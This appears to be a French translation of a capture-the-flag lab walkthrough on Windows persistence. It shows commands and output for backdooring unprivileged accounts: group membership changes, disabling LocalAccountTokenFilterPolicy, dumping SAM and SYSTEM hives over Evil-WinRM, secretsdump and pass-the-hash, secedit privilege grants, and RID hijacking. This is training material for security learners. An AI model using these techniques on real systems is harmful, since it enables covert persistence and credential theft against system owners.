Avoir les informations d'identification d'un administrateur serait le moyen le plus simple d'assurer la persistance sur une machine. Cependant, pour rendre plus difficile la détection de l'équipe bleue, nous pouvons manipuler les utilisateurs non privilégiés, qui ne seront généralement pas autant surveillés que les administrateurs, et leur accorder des privilèges administratifs d'une manière ou d'une autre.

Cliquez sur le bouton Démarrer la machine sur cette tâche avant de continuer. La machine sera disponible sur votre navigateur Web, mais si vous préférez vous connecter via RDP , vous pouvez utiliser les informations d'identification suivantes :

| Nom d'utilisateur | Administrateur |
|-------------------|-----------------|
| Mot de passe | Mot de passe321 |

Remarque : Lorsque vous vous connectez via RDP , la vue existante dans le navigateur sera déconnectée. Après avoir terminé votre session RDP, vous pouvez récupérer la vue dans le navigateur en appuyant sur Reconnecter .

Notez que nous supposons que vous avez déjà obtenu un accès administratif d'une manière ou d'une autre et que vous essayez d'établir la persistance à partir de là.

Attribuer des adhésions à un groupe

Pour cette partie de la tâche, nous supposerons que vous avez vidé les hachages de mot de passe de la machine victime et réussi à déchiffrer les mots de passe des comptes non privilégiés utilisés.

Le moyen direct de faire en sorte qu'un utilisateur non privilégié obtienne des privilèges administratifs est de l'intégrer au groupe Administrateurs . Nous pouvons facilement y parvenir avec la commande suivante :

Invite de commande

```
C:\> net localgroup administrators thmuser0 /add
```

Cela vous permettra d'accéder au serveur en utilisant RDP , WinRM ou tout autre service d'administration à distance disponible.

Si cela semble trop suspect, vous pouvez utiliser le groupe Opérateurs de sauvegarde . Les utilisateurs de ce groupe n'auront pas de privilèges administratifs mais seront autorisés à lire/écrire n'importe quel fichier ou clé de registre sur le système, en ignorant toute DACL configurée . Cela nous permettrait de copier le contenu des ruches de registre SAM et SYSTEM, que nous pourrions ensuite utiliser pour récupérer les hachages de mots de passe de tous les utilisateurs, nous permettant ainsi d'accéder facilement à n'importe quel compte administratif.

Pour ce faire, nous commençons par ajouter le compte au groupe Opérateurs de sauvegarde :

Invite de commande

```
C:\> net localgroup "Backup Operators" thmuser1 /add
```

Puisqu'il s'agit d'un compte non privilégié, il ne peut pas revenir RDP ou WinRM sur la machine à moins que nous l'ajoutions aux groupes Utilisateurs du Bureau à distance ( RDP ) ou Utilisateurs de gestion à distance (WinRM). Nous utiliserons WinRM pour cette tâche :

Invite de commande

```
C:\> net localgroup "Remote Management Users" thmuser1 /add
```

Nous supposerons que nous avons déjà vidé les informations d'identification sur le serveur et que nous disposons du mot de passe de thmuser1. Connectons-nous via WinRM en utilisant ses informations d'identification :

| Nom d'utilisateur | thmuser1 |
|-------------------|-----------------|
| Mot de passe | Mot de passe321 |

Si vous essayez de vous connecter maintenant depuis la machine de votre attaquant, vous seriez surpris de voir que même si vous faites partie du groupe Opérateurs de sauvegarde, vous ne pourrez pas accéder à tous les fichiers comme prévu. Une vérification rapide de nos groupes attribués indiquerait que nous faisons partie des opérateurs de sauvegarde, mais le groupe est désactivé :

Boîte d'attaque

```
user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321

*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

Cela est dû au contrôle de compte d'utilisateur ( UAC ). L'une des fonctionnalités implémentées par l'UAC,  LocalAccountTokenFilterPolicy , supprime tout compte local de ses privilèges administratifs lors de la connexion à distance. Bien que vous puissiez élever vos privilèges via l'UAC à partir d'une session utilisateur graphique (En savoir plus sur l'UAC [ici](https://tryhackme.com/room/windowsfundamentals1xbx) ), si vous utilisez WinRM, vous êtes limité à un jeton d'accès limité sans privilèges administratifs.

Pour pouvoir récupérer les privilèges d'administration de votre utilisateur, nous devrons désactiver LocalAccountTokenFilterPolicy en remplaçant la clé de registre suivante par 1 :

Invite de commande

```
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Une fois tout cela mis en place, nous sommes prêts à utiliser notre utilisateur de porte dérobée. Tout d'abord, établissons une connexion WinRM et vérifions que le groupe Opérateurs de sauvegarde est activé pour notre utilisateur :

Boîte d'attaque

```
user@AttackBox$ evil-winrm -i MACHINE_IP -u thmuser1 -p Password321

*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288

```

Nous procédons ensuite à une sauvegarde des fichiers SAM et SYSTEM et les téléchargeons sur notre machine attaquante :

Boîte d'attaque

```
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```

Remarque : Si Evil-WinRM met trop de temps à télécharger les fichiers, n'hésitez pas à utiliser toute autre méthode de transfert.

Avec ces fichiers, nous pouvons vider les hachages de mots de passe de tous les utilisateurs utilisant `secretsdump.py`ou d'autres outils similaires :

Boîte d'attaque

```
user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6:::
thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:::
[*] Cleaning up...
```

Et enfin, effectuez Pass-the-Hash pour vous connecter à la machine victime avec les privilèges d'administrateur :

Boîte d'attaque

```
user@AttackBox$ evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

Privilèges spéciaux et descripteurs de sécurité

Un résultat similaire à l'ajout d'un utilisateur au groupe Opérateurs de sauvegarde peut être obtenu sans modifier l'appartenance au groupe. Les groupes spéciaux ne sont spéciaux que parce que le système d'exploitation leur attribue des privilèges spécifiques par défaut. Les privilèges sont simplement la capacité d'effectuer une tâche sur le système lui-même. Ils incluent des choses simples comme la possibilité d'arrêter le serveur jusqu'à des opérations très privilégiées comme la possibilité de s'approprier n'importe quel fichier du système. Une liste complète des privilèges disponibles peut être trouvée [ici](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) pour référence.

Dans le cas du groupe Opérateurs de sauvegarde, il dispose des deux privilèges suivants attribués par défaut :

-   SeBackupPrivilege : L'utilisateur peut lire n'importe quel fichier du système, en ignorant toute DACL en place.
-   SeRestorePrivilege : l'utilisateur peut écrire n'importe quel fichier du système, en ignorant toute DACL en place.

Nous pouvons attribuer de tels privilèges à n'importe quel utilisateur, indépendamment de son appartenance à un groupe. Pour ce faire, nous pouvons utiliser la `secedit`commande. Tout d'abord, nous allons exporter la configuration actuelle vers un fichier temporaire :

```
secedit /export /cfg config.inf
```

Nous ouvrons le fichier et ajoutons notre utilisateur aux lignes de la configuration concernant SeBackupPrivilege et SeRestorePrivilege :

![765671a0355e2260c44e5a12a10f090e](https://github.com/dsgsec/Red-Team/assets/82456829/c74b91c2-c288-48fb-bfb0-d60b48c17124)

Nous convertissons enfin le fichier .inf en un fichier .sdb qui est ensuite utilisé pour charger la configuration dans le système :

```
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

Vous devriez maintenant avoir un utilisateur avec des privilèges équivalents à n'importe quel opérateur de sauvegarde. L'utilisateur ne peut toujours pas se connecter au système via WinRM, alors faisons quelque chose. Au lieu d'ajouter l'utilisateur au groupe Utilisateurs de gestion à distance, nous modifierons le descripteur de sécurité associé au service WinRM pour permettre à thmuser2 de se connecter. Considérez un descripteur de sécurité comme une liste de contrôle d'accès mais appliqué à d'autres fonctionnalités du système.

Pour ouvrir la fenêtre de configuration du descripteur de sécurité de WinRM, vous pouvez utiliser la commande suivante dans Powershell (vous devrez utiliser la session GUI pour cela) :

```
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

Cela ouvrira une fenêtre dans laquelle vous pourrez ajouter thmuser2 et lui attribuer tous les privilèges pour vous connecter à WinRM :

![380c80b98c4d1f8c2149ef72427cfeb0](https://github.com/dsgsec/Red-Team/assets/82456829/0bd03b32-e88e-4ff2-b111-2897ef768c4b)

Une fois cela fait, notre utilisateur peut se connecter via WinRM. Étant donné que l'utilisateur dispose des privilèges SeBackup et SeRestore, nous pouvons répéter les étapes pour récupérer les hachages de mot de passe du SAM et nous reconnecter avec l'utilisateur administrateur.

Notez que pour que cet utilisateur puisse utiliser pleinement les privilèges accordés, vous devrez modifier la clé de registre LocalAccountTokenFilterPolicy , mais nous l'avons déjà fait pour obtenir l'indicateur précédent.

Si vous vérifiez les appartenances aux groupes de votre utilisateur, il ressemblera à un utilisateur régulier. Rien de suspect du tout !

Invite de commande

```
C:\> net user thmuser2
User name                    thmuser2

Local Group Memberships      *Users
Global Group memberships     *None

```

Encore une fois, nous supposerons que nous avons déjà vidé les informations d'identification sur le serveur et que nous disposons du mot de passe de thmuser2. Connectons-nous avec ses informations d'identification à l'aide de WinRM :

![Clé THM](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/94fe3c0f556877a2721ca9e0744ad026.png)

| Nom d'utilisateur | thmuser2 |
|-------------------|-----------------|
| Mot de passe | Mot de passe321 |

Nous pouvons nous connecter avec ces informations d'identification pour obtenir le drapeau.

![Drapeau THM](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2cbaa6465407d8b45e363f24a33efec6.png)Connectez-vous à la machine via WinRM en utilisant thmuser2 et exécutez `C:\flags\flag2.exe`pour récupérer votre drapeau.

Détournement du RID

Une autre méthode pour obtenir des privilèges administratifs sans être administrateur consiste à modifier certaines valeurs de registre pour faire croire au système d'exploitation que vous êtes l'administrateur.

Lorsqu'un utilisateur est créé, un identifiant appelé Relative ID (RID) lui est attribué. Le RID est simplement un identifiant numérique représentant l'utilisateur dans l'ensemble du système. Lorsqu'un utilisateur se connecte, le processus LSASS obtient son RID de la ruche de registre SAM et crée un jeton d'accès associé à ce RID. Si nous pouvons altérer la valeur du registre, nous pouvons faire en sorte que Windows attribue un jeton d'accès administrateur à un utilisateur non privilégié en associant le même RID aux deux comptes.

Dans n'importe quel système Windows, le compte Administrateur par défaut se voit attribuer le RID = 500 et les utilisateurs réguliers ont généralement un RID >= 1000 .

Pour rechercher les RID attribués à n'importe quel utilisateur, vous pouvez utiliser la commande suivante :

Invite de commande

```
C:\> wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
```

Le RID est le dernier bit du SID (1010 pour thmuser3 et 500 pour Administrator). Le SID est un identifiant qui permet au système d'exploitation d'identifier un utilisateur sur un domaine, mais le reste ne nous dérangera pas trop pour cette tâche.

Il ne nous reste plus qu'à attribuer le RID=500 à thmuser3. Pour ce faire, nous devons accéder au SAM en utilisant Regedit. Le SAM est limité au compte SYSTEM uniquement, donc même l'administrateur ne pourra pas le modifier. Pour exécuter Regedit en tant que SYSTEM, nous utiliserons psexec, disponible sur `C:\tools\pstools`votre machine :

Invite de commande

```
C:\tools\pstools> PsExec64.exe -i -s regedit
```

Depuis Regedit, nous irons là `HKLM\SAM\SAM\Domains\Account\Users\`où il y aura une clé pour chaque utilisateur de la machine. Puisque nous voulons modifier thmuser3, nous devons rechercher une clé avec son RID en hexadécimal (1010 = 0x3F2). Sous la clé correspondante, il y aura une valeur appelée F , qui contient le RID effectif de l'utilisateur à la position 0x30 :

![d630140974989748ebcf150ba0696d14](https://github.com/dsgsec/Red-Team/assets/82456829/d498a1cb-932b-4875-b7b2-c6b6eaec0e1e)

Notez que le RID est stocké en utilisant la notation little-endian, de sorte que ses octets apparaissent inversés.

Nous allons maintenant remplacer ces deux octets par le RID de l'administrateur en hexadécimal (500 = 0x01F4), en alternant les octets (F401) :

![8f2072b6d13b7343cf7b890586703ddf](https://github.com/dsgsec/Red-Team/assets/82456829/55f2bf6c-b62a-459e-84ee-fd8b3651b1f2)

La prochaine fois que thmuser3 se connectera, LSASS l'associera au même RID en tant qu'administrateur et lui accordera les mêmes privilèges.

Pour cette tâche, nous supposons que vous avez déjà compromis le système et obtenu le mot de passe de thmuser3. Pour votre commodité, l'utilisateur peut se connecter via RDP avec les informations d'identification suivantes :


| Nom d'utilisateur | thmuser3 |
|-------------------|-----------------|
| Mot de passe | Mot de passe321 |

Si vous avez tout fait correctement, vous devriez être connecté au bureau de l'administrateur.\
Remarque : Lorsque vous vous connectez via RDP , la vue existante dans le navigateur sera déconnectée. Après avoir terminé votre session RDP, vous pouvez récupérer la vue dans le navigateur en appuyant sur Reconnecter .
